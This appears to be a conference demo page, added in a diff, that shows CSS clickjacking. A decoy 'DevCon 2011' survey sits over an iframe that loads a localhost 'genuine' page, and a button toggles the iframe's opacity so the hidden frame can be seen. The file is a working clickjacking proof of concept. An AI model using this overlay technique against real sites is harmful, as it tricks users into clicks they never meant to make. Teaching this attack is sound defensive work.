@@ -1,0 +1,42 @@
+﻿<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>CSS Clickjacking</title>
+    <link href="css/style.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+    <form id="frmClickJack" runat="server">
+        <div>
+            <h3>Hello folks! So how's DevCon 2011 going on?</h3>
+            <ul>
+                <li>
+                    <input id="opt1" type="radio" name="q1" value="1" /><label for="opt1">Fantastic</label></li>
+                <li>
+                    <input id="opt2" type="radio" name="q1" value="1" /><label for="opt2">Mind Blowing</label></li>
+                <li>
+                    <input id="opt3" type="radio" name="q1" value="1" /><label for="opt3">Unbelievable</label></li>
+                <li>
+                    <input id="opt4" type="radio" disabled="disabled" name="q1" value="1" /><label for="opt4">I'm
+                        not sure</label></li>
+            </ul>
+            <div>
+                <input id="btnSubmit" type="submit" value="Submit" />
+                <input type="submit" id="btnToggle" value="I'm feeling really lucky!" />    
+            </div>
+        </div>
+        <iframe id="attackingFrame" src="http://localhost/genuine/default.aspx" scrolling="no" class="clickJackFrame">
+        </iframe>
+    </form>
+
+    <script src="js/jquery-1.6.4.min.js" type="text/javascript"></script>
+    <script>        
+        $('#btnToggle').toggle(function () {
+            $('#attackingFrame').hide().css('opacity', 1).fadeIn();
+        },
+        function () {
+            $('#attackingFrame').fadeOut(function () { $(this).show().css('opacity', 0); })
+        });
+    </script>
+</body>
+</html>
